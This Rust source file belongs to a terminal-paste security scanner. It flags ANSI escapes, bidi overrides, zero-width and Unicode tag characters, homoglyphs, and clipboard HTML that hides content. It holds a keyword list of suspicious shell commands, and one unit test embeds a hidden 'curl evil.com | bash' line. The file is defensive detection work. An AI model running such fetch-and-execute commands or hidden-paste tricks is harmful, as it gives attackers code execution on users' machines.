use crate::extract;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Check raw bytes for terminal deception (paste-time).
pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
    check_bytes_with_ignore(input, &[])
}

/// Like [`check_bytes`] but skips bytes whose offset falls inside `ignore_ranges`
/// when deciding to emit a finding and assembling its evidence. Carves out the
/// inert arg span of tirith inspection subcommands (`diff`/`score`/`why`/…); the
/// ignore must be threaded into the scan because `Evidence::Text` findings (e.g.
/// `UnicodeTags`) build their detail from raw bytes.
pub fn check_bytes_with_ignore(
    input: &[u8],
    ignore_ranges: &[std::ops::Range<usize>],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let report = extract::scan_bytes_with_ignored_ranges(input, ignore_ranges);
    let dropped_details = report.dropped_details;
    let scan = report.result;

    if scan.has_ansi_escapes {
        findings.push(Finding {
            rule_id: RuleId::AnsiEscapes,
            severity: Severity::High,
            title: "ANSI escape sequences in pasted content".to_string(),
            description: "Pasted content contains ANSI escape sequences that could hide malicious commands or manipulate terminal display".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("escape"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    let invalid_utf8_evidence = if scan.has_invalid_utf8 {
        invalid_utf8_evidence(input, ignore_ranges)
    } else {
        Vec::new()
    };

    if scan.has_control_chars || !invalid_utf8_evidence.is_empty() {
        let has_invalid_utf8 = !invalid_utf8_evidence.is_empty();
        let mut evidence: Vec<_> = scan
            .details
            .iter()
            .filter(|d| d.description.contains("control"))
            .map(|d| Evidence::ByteSequence {
                offset: d.offset,
                hex: d
                    .codepoint
                    .map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                description: d.description.clone(),
            })
            .collect();
        evidence.extend(invalid_utf8_evidence);
        findings.push(Finding {
            rule_id: RuleId::ControlChars,
            severity: Severity::High,
            title: if has_invalid_utf8 {
                "Malformed terminal text in pasted content".to_string()
            } else {
                "Control characters in pasted content".to_string()
            },
            description: if has_invalid_utf8 {
                "Pasted content contains invalid UTF-8 bytes. Malformed terminal text can hide or change the display of adjacent commands and is refused under the protected paste profile".to_string()
            } else {
                "Pasted content contains control characters (display-overwriting carriage return, backspace, etc.) that could hide the true command being executed".to_string()
            },
            evidence,
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    if scan.has_bidi_controls {
        findings.push(Finding {
            rule_id: RuleId::BidiControls,
            severity: Severity::Critical,
            title: "Bidirectional control characters detected".to_string(),
            description: "Content contains Unicode bidi override characters that can make text appear to read in a different order than it actually executes".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("bidi"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_zero_width {
        // Suppress ZWJ (U+200D) / ZWNJ (U+200C) when surrounded by joining-script
        // characters (Arabic, Devanagari, Thai, etc.) — there they are legitimate.
        let zw_evidence: Vec<_> = scan
            .details
            .iter()
            .filter(|d| d.description.contains("zero-width"))
            .filter(|d| {
                let is_zwj_or_zwnj =
                    d.description.contains("U+200D") || d.description.contains("U+200C");
                if is_zwj_or_zwnj && is_joining_script_context(input, d.offset) {
                    return false;
                }
                true
            })
            .collect();

        if !zw_evidence.is_empty() {
            // Zero-width chars in otherwise pure ASCII have no legit use — elevate.
            let ascii_only = std::str::from_utf8(input)
                .map(|s| {
                    s.chars()
                        .filter(|ch| {
                            ch.is_alphanumeric() || ch.is_ascii_punctuation() || *ch == ' '
                        })
                        .all(|ch| ch.is_ascii())
                })
                .unwrap_or(false);
            let severity = if ascii_only {
                Severity::Critical
            } else {
                Severity::High
            };

            findings.push(Finding {
                rule_id: RuleId::ZeroWidthChars,
                severity,
                title: "Zero-width characters detected".to_string(),
                description: "Content contains invisible zero-width characters that could be used to obfuscate URLs or commands".to_string(),
                evidence: zw_evidence
                    .into_iter()
                    .map(|d| Evidence::ByteSequence {
                        offset: d.offset,
                        hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                        description: d.description.clone(),
                    })
                    .collect(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    if scan.has_invisible_math_operators {
        findings.push(Finding {
            rule_id: RuleId::InvisibleMathOperator,
            severity: Severity::Medium,
            title: "Invisible math operator characters detected".to_string(),
            description: "Content contains invisible Unicode math operators (U+2061–U+2064) that could be used to obfuscate content".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("invisible math operator"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_unicode_tags {
        // Decode excluding ignore-range bytes so hidden-text evidence can't leak
        // from an inert arg span; if every tag byte was ignored, skip emission.
        let decoded = decode_unicode_tags(input, ignore_ranges);
        if !decoded.is_empty() || has_unicode_tag_outside_ranges(input, ignore_ranges) {
            findings.push(Finding {
                rule_id: RuleId::UnicodeTags,
                severity: Severity::Critical,
                title: "Unicode Tags (hidden ASCII) detected".to_string(),
                description: "Content contains Unicode Tag characters (U+E0000–U+E007F) that encode hidden ASCII text invisible to the user".to_string(),
                evidence: vec![Evidence::Text {
                    detail: if decoded.is_empty() {
                        "Hidden text could not be decoded".to_string()
                    } else {
                        format!("Hidden text: \"{}\"", truncate(&decoded, 200))
                    },
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    if scan.has_variation_selectors {
        findings.push(Finding {
            rule_id: RuleId::VariationSelector,
            severity: Severity::Medium,
            title: "Variation selector characters detected".to_string(),
            description: "Content contains Unicode variation selectors (VS1-256). These are commonly used in emoji sequences but may indicate steganographic encoding or obfuscation".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("variation selector"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_invisible_whitespace {
        findings.push(Finding {
            rule_id: RuleId::InvisibleWhitespace,
            severity: Severity::Medium,
            title: "Invisible whitespace characters detected".to_string(),
            description: "Content contains unusual Unicode whitespace variants (en space, em space, figure space, etc.) that could be used for steganographic encoding or command obfuscation".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("invisible whitespace"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    if scan.has_confusable_text {
        // Two-tier suppression to avoid firing on natural multilingual text:
        // math alphanumerics ("text confusable U+") use a ±16-byte ASCII
        // proximity check; standard Cyrillic/Greek ("confusable U+") only flag
        // when mixed INTO an ASCII word ("gіthub" attack vs "Note: Привет" benign).
        let confusable_details: Vec<_> = scan
            .details
            .iter()
            .filter(|d| {
                d.description.contains("confusable U+")
                    || d.description.contains("text confusable U+")
            })
            .filter(|d| {
                if d.description.contains("text confusable U+") {
                    is_ascii_nearby(input, d.offset)
                } else {
                    is_same_word_as_ascii(input, d.offset)
                }
            })
            .collect();

        if !confusable_details.is_empty() {
            findings.push(Finding {
                rule_id: RuleId::ConfusableText,
                severity: Severity::High,
                title: "Confusable Unicode characters in text".to_string(),
                description: "Content contains Unicode characters visually identical to ASCII (math alphanumerics, Cyrillic/Greek lookalikes) appearing near ASCII text, which may indicate a homoglyph attack".to_string(),
                evidence: confusable_details
                    .iter()
                    .take(10)
                    .map(|d| Evidence::ByteSequence {
                        offset: d.offset,
                        hex: d.codepoint.map_or_else(
                            || format!("0x{:02x}", d.byte),
                            |cp| format!("U+{cp:04X}"),
                        ),
                        description: d.description.clone(),
                    })
                    .collect(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    if scan.has_hangul_fillers {
        findings.push(Finding {
            rule_id: RuleId::HangulFiller,
            severity: Severity::Medium,
            title: "Hangul Filler characters detected".to_string(),
            description: "Content contains invisible Hangul Filler characters (U+3164, U+115F, U+1160) that could be used to hide content or obfuscate commands".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("hangul filler"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    if dropped_details > 0 {
        findings.push(Finding {
            rule_id: RuleId::AnalysisIncomplete,
            severity: Severity::High,
            title: "Terminal byte scan retained only part of its evidence".to_string(),
            description: "The input produced more byte-level detail records than Tirith's \
                          bounded retention cap. Records kept before the cap were analyzed, \
                          and the omitted records are reported instead of being treated as \
                          absent."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "byte_detail_omitted_count={} retained_cap={}",
                    dropped_details,
                    extract::ByteScanResult::MAX_RETAINED_DETAILS
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    findings
}

/// Return bounded evidence for every malformed UTF-8 sequence whose first byte
/// is outside an inert inspection-argument range. `Utf8Error::valid_up_to` and
/// `error_len` let us advance over each malformed sequence without discarding a
/// valid scalar immediately before or after it.
fn invalid_utf8_evidence(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> Vec<Evidence> {
    const MAX_INVALID_UTF8_EVIDENCE: usize = 16;

    let mut evidence = Vec::new();
    let mut cursor = 0;
    while cursor < input.len() && evidence.len() < MAX_INVALID_UTF8_EVIDENCE {
        let error = match std::str::from_utf8(&input[cursor..]) {
            Ok(_) => break,
            Err(error) => error,
        };
        let offset = cursor + error.valid_up_to();
        let invalid_len = error
            .error_len()
            .unwrap_or_else(|| input.len().saturating_sub(offset))
            .max(1);
        let end = offset.saturating_add(invalid_len).min(input.len());
        for (invalid_offset, byte) in input.iter().enumerate().take(end).skip(offset) {
            if evidence.len() == MAX_INVALID_UTF8_EVIDENCE {
                break;
            }
            if ignore_ranges
                .iter()
                .any(|range| range.contains(&invalid_offset))
            {
                continue;
            }
            evidence.push(Evidence::ByteSequence {
                offset: invalid_offset,
                hex: format!("0x{byte:02x}"),
                description: "invalid UTF-8 byte in terminal input".to_string(),
            });
        }
        cursor = end;
    }
    evidence
}

/// Decode Unicode Tag characters (U+E0000–U+E007F) to hidden ASCII (codepoint -
/// 0xE0000). `ignore_ranges` offsets are skipped so inert-arg-span content can't
/// leak out through the evidence string.
fn decode_unicode_tags(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> String {
    let Ok(s) = std::str::from_utf8(input) else {
        eprintln!("tirith: warning: unicode tag decode failed: input is not valid UTF-8");
        return String::new();
    };
    let mut decoded = String::new();
    for (byte_off, ch) in s.char_indices() {
        if ignore_ranges.iter().any(|r| r.contains(&byte_off)) {
            continue;
        }
        let cp = ch as u32;
        if (0xE0001..=0xE007F).contains(&cp) {
            let ascii = (cp - 0xE0000) as u8;
            if ascii.is_ascii_graphic() || ascii == b' ' {
                decoded.push(ascii as char);
            }
        }
    }
    decoded
}

/// Returns true iff `input` contains at least one Unicode Tag byte at an
/// offset that falls OUTSIDE every ignore range.
fn has_unicode_tag_outside_ranges(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> bool {
    let Ok(s) = std::str::from_utf8(input) else {
        return false;
    };
    for (byte_off, ch) in s.char_indices() {
        if ignore_ranges.iter().any(|r| r.contains(&byte_off)) {
            continue;
        }
        let cp = ch as u32;
        if (0xE0001..=0xE007F).contains(&cp) {
            return true;
        }
    }
    false
}

/// Check for hidden multiline content in string input.
pub fn check_hidden_multiline(input: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    let lines: Vec<&str> = input.lines().collect();
    if lines.len() > 1 {
        // Skip line 0 (what the user means to run); suspicious shapes on later
        // lines are the paste-smuggling pattern.
        for (i, line) in lines.iter().enumerate().skip(1) {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            if looks_like_hidden_command(trimmed) {
                findings.push(Finding {
                    rule_id: RuleId::HiddenMultiline,
                    severity: Severity::High,
                    title: "Hidden multiline content detected".to_string(),
                    description: format!(
                        "Pasted content has a hidden command on line {}: '{}'",
                        i + 1,
                        truncate(trimmed, 60)
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!("line {}: {}", i + 1, truncate(trimmed, 100)),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                break;
            }
        }
    }

    findings
}

/// `true` only when BOTH non-Common neighbors of the ZWJ/ZWNJ at `byte_offset`
/// are in the SAME joining script (Arabic, Devanagari, …), where they are
/// legitimate. One-sided joining (Latin + ZWJ + Arabic) is suspicious and not
/// suppressed.
pub(crate) fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
    use unicode_script::{Script, UnicodeScript};

    let Ok(text) = std::str::from_utf8(input) else {
        return false;
    };

    let zw_char = text[byte_offset..].chars().next();
    let zw_len = zw_char.map(|c| c.len_utf8()).unwrap_or(1);

    // Script::Common/Inherited don't identify a writing system — skip them.
    let significant_script = |ch: char| {
        let s = ch.script();
        if s == Script::Common || s == Script::Inherited {
            None
        } else {
            Some(s)
        }
    };

    let before_script = if byte_offset > 0 {
        let mut prev_start = byte_offset - 1;
        while prev_start > 0 && !text.is_char_boundary(prev_start) {
            prev_start -= 1;
        }
        text[prev_start..]
            .chars()
            .next()
            .and_then(significant_script)
    } else {
        None
    };

    let after_offset = byte_offset + zw_len;
    let after_script = if after_offset < text.len() {
        text[after_offset..]
            .chars()
            .next()
            .and_then(significant_script)
    } else {
        None
    };

    // Require the SAME joining script on both sides; one-sided or mismatched is
    // the attack shape we want to flag.
    match (before_script, after_script) {
        (Some(before), Some(after)) => before == after && is_joining_script(before),
        _ => false,
    }
}

/// Scripts that legitimately use ZWJ/ZWNJ for character joining/shaping.
fn is_joining_script(script: unicode_script::Script) -> bool {
    use unicode_script::Script;
    matches!(
        script,
        Script::Arabic
            | Script::Syriac
            | Script::Mandaic
            | Script::Mongolian
            | Script::Devanagari
            | Script::Bengali
            | Script::Gurmukhi
            | Script::Gujarati
            | Script::Oriya
            | Script::Tamil
            | Script::Telugu
            | Script::Kannada
            | Script::Malayalam
            | Script::Sinhala
            | Script::Thai
            | Script::Tibetan
            | Script::Myanmar
    )
}

/// Check clipboard HTML for content hidden from the plain-text paste (CSS/color
/// hiding, hidden attributes, or extra text) that the terminal never sees.
pub fn check_clipboard_html(html: &str, plain_text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    let rendered_findings = crate::rules::rendered::check(html, None);

    // Hidden-content rules become ClipboardHidden (same evidence, distinct rule
    // id) so downstream UI can tell "paste hides more than shown" from a
    // "rendered page has hidden bits".
    for f in rendered_findings {
        match f.rule_id {
            RuleId::HiddenCssContent | RuleId::HiddenColorContent | RuleId::HiddenHtmlAttribute => {
                findings.push(Finding {
                    rule_id: RuleId::ClipboardHidden,
                    severity: Severity::High,
                    title: "Clipboard HTML contains hidden content".to_string(),
                    description: format!(
                        "Rich-text clipboard has content hidden from visual rendering: {}",
                        f.description
                    ),
                    evidence: f.evidence,
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
            _ => {}
        }
    }

    let visible_text = strip_html_tags(html);
    let visible_len = visible_text.trim().chars().count();
    let plain_len = plain_text.trim().chars().count();

    if visible_len > plain_len + 50 {
        findings.push(Finding {
            rule_id: RuleId::ClipboardHidden,
            severity: Severity::High,
            title: "Clipboard HTML contains more text than visible paste".to_string(),
            description: format!(
                "HTML content has ~{visible_len} chars of text vs {plain_len} chars in plain text \
                 ({} chars hidden)",
                visible_len - plain_len
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "HTML visible text: {visible_len} chars, plain text: {plain_len} chars"
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    // repo-0334: the deception check was one-directional. A benign-looking
    // HTML part with a LONGER or simply DIFFERENT malicious text/plain payload
    // (the string the terminal actually pastes) is the dangerous direction.
    if plain_len > visible_len + 50 {
        findings.push(Finding {
            rule_id: RuleId::ClipboardHidden,
            severity: Severity::High,
            title: "Clipboard plain text contains more than rendered HTML".to_string(),
            description: format!(
                "Plain-text payload has ~{plain_len} chars vs {visible_len} chars of HTML-visible \
                 text ({} chars only in the pasted text)",
                plain_len - visible_len
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "plain text: {plain_len} chars, HTML visible text: {visible_len} chars"
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    // repo-0334: equal-LENGTH but different content must not pass either. When
    // both parts are non-trivial and no directional finding fired, require a
    // majority of the plain text's words to appear in the HTML-visible text.
    if plain_len >= 20 && visible_len >= 20 && findings.is_empty() {
        let visible_words: std::collections::HashSet<String> = visible_text
            .split_whitespace()
            .map(|w| w.to_lowercase())
            .collect();
        let plain_words: Vec<String> = plain_text
            .split_whitespace()
            .map(|w| w.to_lowercase())
            .collect();
        if !plain_words.is_empty() {
            let overlap = plain_words
                .iter()
                .filter(|w| visible_words.contains(*w))
                .count();
            if overlap * 2 < plain_words.len() {
                findings.push(Finding {
                    rule_id: RuleId::ClipboardHidden,
                    severity: Severity::High,
                    title: "Clipboard plain text differs from rendered HTML".to_string(),
                    description: "The text/plain payload shares fewer than half its words with \
                        the HTML-visible content — the pasted command is not what the rendered \
                        preview showed."
                        .to_string(),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "word overlap {overlap}/{} between plain text and HTML-visible text",
                            plain_words.len()
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }
    }

    findings
}

/// Strip HTML tags to extract approximate visible text content.
fn strip_html_tags(html: &str) -> String {
    use once_cell::sync::Lazy;
    use regex::Regex;

    static SCRIPT_STYLE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?is)<(?:script|style)[^>]*>.*?</(?:script|style)>").unwrap());
    static TAGS: Lazy<Regex> = Lazy::new(|| Regex::new(r"<[^>]*>").unwrap());
    static ENTITIES: Lazy<Regex> = Lazy::new(|| Regex::new(r"&[a-zA-Z]+;|&#\d+;").unwrap());
    static WHITESPACE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\s+").unwrap());

    let s = SCRIPT_STYLE.replace_all(html, " ");
    let s = TAGS.replace_all(&s, " ");
    let s = ENTITIES.replace_all(&s, " ");
    let s = WHITESPACE.replace_all(&s, " ");
    s.trim().to_string()
}

/// ASCII letters within ±16 bytes (for math alphanumerics, no legit terminal use).
pub(crate) fn is_ascii_nearby(input: &[u8], offset: usize) -> bool {
    let start = offset.saturating_sub(16);
    let end = (offset + 16).min(input.len());
    input[start..end].iter().any(|b| b.is_ascii_alphabetic())
}

/// `true` when the confusable char at `offset` shares a "word" with ASCII
/// letters — no boundary between the two:
/// - `gіthub` → true (Cyrillic `і` mixed into a Latin word — the attack shape).
/// - `Note: Привет`, `echo Привет` → false (whitespace/`:` boundary; the
///   Cyrillic word has no ASCII).
/// - `Rustを使う。` → false (the Hiragana terminates the word, so the `。`
///   confusable is isolated from `Rust`). Fixes #126.
/// - `…/filename_Отсканированный_документ.pdf` → false (path/`_` separators
///   isolate the pure-Cyrillic segments). Fixes #134.
///
/// Boundaries are script-aware: any non-alphanumeric ASCII byte (whitespace,
/// punctuation, and identifier/path separators like `/ _ . -`), plus any
/// character whose Unicode script is outside the confusable-bearing set
/// {Latin, Cyrillic, Greek, Common, Inherited} — so Han/Hiragana/Katakana/
/// Hangul/Thai/Arabic/… terminate a word. The word is suspicious only if, after
/// trimming at those boundaries, it still contains an ASCII letter.
pub(crate) fn is_same_word_as_ascii(input: &[u8], offset: usize) -> bool {
    use unicode_script::{Script, UnicodeScript};

    // Chars that stay *inside* a word. Non-alphanumeric ASCII and any
    // non-confusable-bearing script are boundaries that split it.
    fn is_word_char(ch: char) -> bool {
        if ch.is_ascii() {
            return ch.is_ascii_alphanumeric();
        }
        matches!(
            ch.script(),
            Script::Latin | Script::Cyrillic | Script::Greek | Script::Common | Script::Inherited
        )
    }

    let Ok(text) = std::str::from_utf8(input) else {
        // Non-UTF-8 buffer (e.g. a binary file): fall back to the conservative
        // ASCII-only boundary scan so we never silently stop flagging.
        return same_word_as_ascii_bytes(input, offset);
    };
    if offset > text.len() || !text.is_char_boundary(offset) {
        return false;
    }

    // Expand left to the start of the word (the confusable itself is covered by
    // the forward pass below).
    let mut word_start = offset;
    for (i, ch) in text[..offset].char_indices().rev() {
        if !is_word_char(ch) {
            break;
        }
        word_start = i;
    }

    // Expand right to the end of the word.
    let mut word_end = offset;
    for (i, ch) in text[offset..].char_indices() {
        if !is_word_char(ch) {
            break;
        }
        word_end = offset + i + ch.len_utf8();
    }

    text.as_bytes()[word_start..word_end]
        .iter()
        .any(|b| b.is_ascii_alphabetic())
}

/// Conservative ASCII-only fallback used only when the scanned buffer is not
/// valid UTF-8 (binary content): only ASCII whitespace/punctuation breaks a
/// word. Over-flags rather than under-flags, matching the prior heuristic.
fn same_word_as_ascii_bytes(input: &[u8], offset: usize) -> bool {
    fn is_word_boundary(b: u8) -> bool {
        matches!(
            b,
            b' ' | b'\t'
                | b'\n'
                | b'\r'
                | b':'
                | b';'
                | b','
                | b'('
                | b')'
                | b'['
                | b']'
                | b'{'
                | b'}'
                | b'"'
                | b'\''
                | b'='
                | b'|'
                | b'&'
                | b'<'
                | b'>'
        )
    }

    let mut word_start = offset;
    while word_start > 0 && !is_word_boundary(input[word_start - 1]) {
        word_start -= 1;
    }

    let mut word_end = offset;
    while word_end < input.len() && !is_word_boundary(input[word_end]) {
        word_end += 1;
    }

    input[word_start..word_end]
        .iter()
        .any(|b| b.is_ascii_alphabetic())
}

fn looks_like_hidden_command(line: &str) -> bool {
    let suspicious = [
        "curl ", "wget ", "http ", "https ", "xh ", "bash", "/bin/", "sudo ", "rm ", "chmod ",
        "eval ", "exec ", "> /", ">> /", "| sh",
    ];
    suspicious.iter().any(|p| line.contains(p))
}

fn truncate(s: &str, max: usize) -> String {
    let prefix = crate::util::truncate_bytes(s, max);
    if prefix.len() == s.len() {
        prefix
    } else {
        format!("{prefix}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn variation_flood_cannot_downgrade_later_critical_zero_width() {
        let input = format!(
            "ASCII{}\u{200B}",
            "\u{FE0F}".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS)
        );
        let findings = check_bytes(input.as_bytes());
        let zero_width = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ZeroWidthChars)
            .expect("zero-width class must retain representative evidence");

        assert_eq!(zero_width.severity, Severity::Critical);
        assert!(!zero_width.evidence.is_empty());
        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::VariationSelector));
    }

    #[test]
    fn benign_joiner_flood_cannot_exhaust_suspicious_zero_width_evidence() {
        let benign =
            "ا\u{200d}ا ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
        let input = format!("{benign}echo sa\u{200b}fe");
        let findings = check_bytes(input.as_bytes());
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ZeroWidthChars)
            .expect("later suspicious zero-width character must survive contextual retention");
        assert!(finding.evidence.iter().any(|evidence| matches!(
            evidence,
            Evidence::ByteSequence { hex, .. } if hex == "U+200B"
        )));
        assert!(
            findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.evidence.iter().any(|evidence| {
                        matches!(
                            evidence,
                            Evidence::Text { detail } if detail.contains("byte_detail_omitted_count=")
                        )
                    })
            }),
            "omitted byte-scan details must be their own AnalysisIncomplete finding: {findings:?}"
        );
    }

    #[test]
    fn omitted_byte_details_emit_analysis_incomplete_even_without_other_findings() {
        // Joiner-script ZWJ is legitimate, so the class flag is set but no
        // ZeroWidthChars finding is emitted. Overflowing the per-class detail
        // cap must still surface the gap instead of failing open.
        let input =
            "ا\u{200d}ا ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
        let findings = check_bytes(input.as_bytes());
        assert!(
            findings
                .iter()
                .all(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
            "benign joiner flood must not emit a security finding besides the gap: {findings:?}"
        );
        let incomplete = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
            .expect("exceeding the byte-scan detail cap must emit AnalysisIncomplete");
        assert_eq!(incomplete.severity, Severity::High);
        assert!(incomplete.evidence.iter().any(|evidence| matches!(
            evidence,
            Evidence::Text { detail }
                if detail.contains("byte_detail_omitted_count=")
                    && detail.contains("retained_cap=")
        )));
    }

    #[test]
    fn benign_confusable_flood_cannot_exhaust_mixed_word_evidence() {
        let benign = "а ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
        let input = format!("{benign}gіthub");
        let findings = check_bytes(input.as_bytes());
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ConfusableText)
            .expect("later mixed-script confusable must survive contextual retention");
        assert!(finding.evidence.iter().any(|evidence| matches!(
            evidence,
            Evidence::ByteSequence { hex, .. } if hex == "U+0456"
        )));
        assert!(finding.evidence.iter().all(|evidence| !matches!(
            evidence,
            Evidence::ByteSequence { hex, .. } if hex == "U+0430"
        )));
    }

    #[test]
    fn malformed_utf8_is_an_explicit_protected_paste_finding() {
        let findings = check_bytes(b"printf safe\xff");
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ControlChars)
            .expect("invalid UTF-8 must produce a security finding");
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.title.contains("Malformed terminal text"));
        assert!(finding.evidence.iter().any(|evidence| matches!(
            evidence,
            Evidence::ByteSequence { offset: 11, hex, description }
                if hex == "0xff" && description.contains("invalid UTF-8")
        )));
    }

    #[test]
    fn malformed_utf8_cannot_hide_an_adjacent_bidi_control() {
        let input = b"echo \xe2\x80\xae\xffsafe";
        let findings = check_bytes(input);
        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::BidiControls));
        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::ControlChars));
    }

    #[test]
    fn malformed_utf8_inside_an_inert_range_is_not_reported() {
        let input = b"ok\xff";
        let ignored_range = 2..3;
        let findings = check_bytes_with_ignore(input, std::slice::from_ref(&ignored_range));
        assert!(!findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::ControlChars));
    }

    #[test]
    fn test_clipboard_html_css_hiding() {
        let html = r#"<div style="display:none">secret command: curl evil.com | bash</div><p>Hello World</p>"#;
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden),
            "should detect CSS hiding in clipboard HTML"
        );
    }

    #[test]
    fn test_clipboard_html_length_discrepancy() {
        let html = r#"<p>Hello World</p><p>This is a long paragraph of hidden instructions that the terminal user never sees because only plain text is pasted into the terminal window.</p>"#;
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden && f.title.contains("more text")),
            "should detect length discrepancy: {findings:?}"
        );
    }

    #[test]
    fn test_clipboard_html_clean_no_finding() {
        let html = "<p>Hello World</p>";
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings.is_empty(),
            "clean clipboard HTML should not trigger: {findings:?}"
        );
    }

    #[test]
    fn test_clipboard_html_color_hiding() {
        let html = r#"<span style="color: #ffffff; background-color: #ffffff">secret</span><p>Normal text</p>"#;
        let plain_text = "Normal text";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden),
            "should detect color hiding in clipboard HTML"
        );
    }

    #[test]
    fn test_strip_html_tags() {
        assert_eq!(strip_html_tags("<p>Hello</p>"), "Hello");
        assert_eq!(strip_html_tags("<div><span>A</span> <b>B</b></div>"), "A B");
        assert_eq!(strip_html_tags("No tags here"), "No tags here");
        assert_eq!(strip_html_tags("&amp; &lt;"), "");
    }
}
